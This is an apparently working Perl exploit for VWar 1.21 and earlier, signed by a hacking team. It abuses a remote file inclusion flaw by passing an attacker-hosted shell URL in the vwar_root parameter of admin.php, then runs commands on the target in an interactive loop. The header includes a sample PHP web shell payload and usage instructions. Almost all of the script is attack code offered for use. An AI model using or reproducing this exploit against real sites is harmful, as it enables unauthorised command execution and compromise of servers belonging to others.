#!/usr/bin/perl
#
# Exploit by s3rv3r_hack3r
# Special Thanx : hessamx ,sattar.li , stanic, mfox,blood moon and..
######################################################
#  ___ ___                __                         #
# /   |   \_____    ____ |  | __ ___________________ #
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   / #
#\    Y    // __ \\  \___|    <\  ___/|  | \//    /  #
# \___|_  /(____  )\___  >__|_ \\___  >__|  /_____ \ #
#       \/      \/     \/     \/    \/            \/ #
#             Iran Hackerz Security Team             #
#               WebSite: www.hackerz.ir              #
######################################################
# VWar <= ver 1.21 Remote Code Execution Exploit     #
# usage: >>>>                                        #
# perl vwar.pl +location of VWar+ +shell Url+        #
# location example :http://raeget/modules/vwar/admin #
# cmd shell example: <?shell_exec($_GET[cmd]);?>     #
######################################################
use LWP::Simple;

print "-------------------------------------------\n";
print "=       vwar Exploit BY s3rv3r_hack3r     =\n";
print "=          IHST (WwW.hackerz.ir)          =\n";
print"-------------------------------------------\n\n";

$targ = $ARGV[0];
$cmdurl = $ARGV[1];

   $con=get("http://".$targ) || die "[-]Cannot connect to Host";
while ()
{

     print "Cmd@IHST |\$";
     chomp($cmd=<STDIN>);


$commd=get("http://".$targ."/admin.php?vwar_root=".$cmdurl."&cmd=".$cmd)
}
